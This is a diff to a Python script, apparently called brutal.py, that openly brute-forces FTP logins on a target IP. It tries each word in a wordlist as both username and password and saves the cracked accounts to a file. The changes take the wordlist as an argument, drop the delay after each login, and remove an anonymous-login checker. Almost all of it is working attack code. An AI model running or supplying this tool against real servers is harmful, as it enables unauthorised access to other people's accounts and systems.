@@ -1,4 +1,3 @@
-# Implementing FTP attacker
 import ftplib
 import os, sys, time
 
@@ -8,18 +7,8 @@ class colors:
     YELLOW = '\033[93m' # YELLOW COLOR
     RED = '\033[91m'    # RED COLOR
     RESET = '\033[0m'   # RESET COLOR
-'''
-def anonLogin(IP):
-    ftp = ftplib.FTP(IP)
-    try:
-        ftp.login('anonymous','')
-        print(f"[{colors.GREEN}+{colors.RESET}] Anonymous login found on {IP}!\n")
-        ftp.quit()
-    except Exception as e:
-        print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
-        print(e)
-'''
-def ftpBruteForce(IP):
+
+def ftpBruteForce(IP, wordlist):
     # List to store the correct credentials
     credentials = []
     
@@ -35,23 +24,22 @@ def ftpBruteForce(IP):
         print(e)
 
     # Starting brute-force attack
-    f = open('100-credentials-list.txt', 'r')
+    f = open(wordlist, 'r')
     for word in f.readlines():
         word = word.strip('\n')
         try:
             ftp = ftplib.FTP(IP, timeout=1)
             ftp.login(word,word)
-            print(f"[{colors.GREEN}+{colors.RESET}] Login successful using {word}:{word}")
+            print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {word}:{word}\n")
             credentials.append(word+":"+word)
             ftp.quit()
-            time.sleep(3)
         except Exception as e:
             print(f"[{colors.RED}-{colors.RESET}] Login failed using {word}:{word}")
     f.close()
 
     # Checking whether we got some credentials or not
     if(len(credentials) != 0):
-        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} credentials found!")
+        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} user accounts cracked!")
         filename = f"{IP}-FTP-cracked-list.txt"
         os.system(f'touch {filename}')
         f = open(filename, 'w')
@@ -67,15 +55,22 @@ def main():
         target = sys.argv[1]
         checker = target.split('.')
         if(len(checker) == 4):
+            wordlist = sys.argv[2]
+            try:
+                f = open(wordlist, 'r')
+                f.close()
+            except OSError as e:
+                print(f"[{colors.RED}-{colors.RESET}] {e}")
+                exit()
             print(f"Target locked: {colors.YELLOW}{target}{colors.RESET}\n")
             print("Initiating attack...\n")
             time.sleep(3)
-            ftpBruteForce(target)
+            ftpBruteForce(target, wordlist)
         else:
-            print(f"[{colors.RED}-{colors.RESET}] Incorrect argument")
+            print(f"[{colors.RED}-{colors.RESET}] Incorrect IP address")
+            print("INPUT FORMAT: python3 brutal.py <TARGET IP> <WORDLIST> <ftp or ssh or http>")
     except Exception as e:
-        print(f"[{colors.RED}-{colors.RESET}] Incorrect arguments")
         print(f"Error:{e}")
-        print("INPUT FORMAT: python3 brutal.py <TARGET IP>")
+        print("INPUT FORMAT: python3 brutal.py <TARGET IP> <WORDLIST> <ftp or ssh or http>")
 
 main()
